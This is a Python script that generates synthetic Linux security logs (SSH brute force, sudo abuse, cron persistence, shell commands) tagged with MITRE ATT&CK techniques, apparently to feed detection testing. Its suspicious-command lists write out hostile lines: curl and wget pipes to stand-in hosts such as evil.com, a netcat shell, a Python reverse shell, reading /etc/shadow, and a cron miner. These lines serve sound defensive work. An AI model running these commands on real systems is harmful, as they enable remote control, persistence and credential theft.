"""Linux telemetry log generator - SSH, sudo, cron, shell events."""
import random
from datetime import datetime, timezone

USERS = ["root", "ubuntu", "centos", "admin", "devops", "www-data", "mysql", "deploy", "analyst"]
HOSTS = ["web-srv01", "db-srv01", "app-srv01", "jump-box", "mail-srv01", "k8s-node01", "bastion"]
EXT_IPS = ["203.0.113.5", "198.51.100.23", "45.33.32.156", "185.220.101.1", "91.219.236.222"]
SHELLS = ["/bin/bash", "/bin/sh", "/usr/bin/python3", "/usr/bin/perl"]
SUSPICIOUS_CMDS = [
    "cat /etc/shadow", "wget http://evil.com/backdoor.sh | bash",
    "nc -lvp 4444 -e /bin/bash", "curl http://c2.bad.com/beacon | sh",
    "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.5\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'",
    "chmod +s /usr/bin/find", "echo '* * * * * /tmp/.hidden/miner' >> /var/spool/cron/root",
]
NORMAL_CMDS = ["ls -la", "systemctl status nginx", "cat /var/log/syslog", "df -h", "top -b -n1", "ps aux"]


def _rip(internal=True):
    if internal:
        return f"10.{random.randint(0,5)}.{random.randint(0,255)}.{random.randint(1,254)}"
    return random.choice(EXT_IPS)


def generate_ssh_brute_force():
    src = _rip(False)
    u, h = random.choice(USERS[:4]), random.choice(HOSTS)
    return {
        "timestamp": datetime.now(timezone.utc).isoformat(), "source": "linux",
        "source_ip": src, "destination_ip": _rip(), "destination_port": 22,
        "event_type": "ssh_failed_login", "severity": "high", "hostname": h,
        "username": u, "process_name": "sshd",
        "raw_log": f"sshd[{random.randint(1000,50000)}]: Failed password for {u} from {src} port {random.randint(30000,65000)} ssh2",
        "mitre_tactic": "Credential Access", "mitre_technique": "T1110",
        "mitre_technique_name": "Brute Force", "is_malicious": 1,
    }


def generate_sudo_abuse():
    u, h = random.choice(USERS[1:5]), random.choice(HOSTS)
    cmd = random.choice(SUSPICIOUS_CMDS[:3])
    return {
        "timestamp": datetime.now(timezone.utc).isoformat(), "source": "linux",
        "source_ip": _rip(), "event_type": "sudo_execution", "severity": "high",
        "hostname": h, "username": u, "process_name": "sudo",
        "command_line": f"sudo {cmd}",
        "raw_log": f"sudo: {u} : TTY=pts/0 ; PWD=/home/{u} ; USER=root ; COMMAND={cmd}",
        "mitre_tactic": "Privilege Escalation", "mitre_technique": "T1548.003",
        "mitre_technique_name": "Sudo and Sudo Caching", "is_malicious": 2,
    }


def generate_cron_persistence():
    h = random.choice(HOSTS)
    job = random.choice(["* * * * * /tmp/.hidden/miner", "*/5 * * * * curl http://c2.bad.com/check | sh",
                          "0 * * * * /opt/.backdoor/persist.sh"])
    return {
        "timestamp": datetime.now(timezone.utc).isoformat(), "source": "linux",
        "source_ip": _rip(), "event_type": "cron_modification", "severity": "high",
        "hostname": h, "username": "root", "process_name": "crontab",
        "command_line": job,
        "raw_log": f"CRON: crontab modified for root on {h} - new entry: {job}",
        "mitre_tactic": "Persistence", "mitre_technique": "T1053.003",
        "mitre_technique_name": "Cron", "is_malicious": 2,
    }


def generate_suspicious_shell():
    u, h = random.choice(USERS), random.choice(HOSTS)
    is_sus = random.random() > 0.4
    cmd = random.choice(SUSPICIOUS_CMDS) if is_sus else random.choice(NORMAL_CMDS)
    return {
        "timestamp": datetime.now(timezone.utc).isoformat(), "source": "linux",
        "source_ip": _rip(), "event_type": "shell_command", "severity": "high" if is_sus else "info",
        "hostname": h, "username": u, "process_name": random.choice(SHELLS),
        "command_line": cmd,
        "raw_log": f"bash[{random.randint(1000,50000)}]: {u}@{h}$ {cmd}",
        "mitre_tactic": "Execution", "mitre_technique": "T1059.004",
        "mitre_technique_name": "Unix Shell", "is_malicious": 2 if is_sus else 0,
    }


LINUX_GENERATORS = [
    (generate_ssh_brute_force, 35), (generate_sudo_abuse, 20),
    (generate_cron_persistence, 15), (generate_suspicious_shell, 30),
]


def generate_linux_log():
    gens, weights = zip(*LINUX_GENERATORS)
    return random.choices(gens, weights=weights, k=1)[0]()
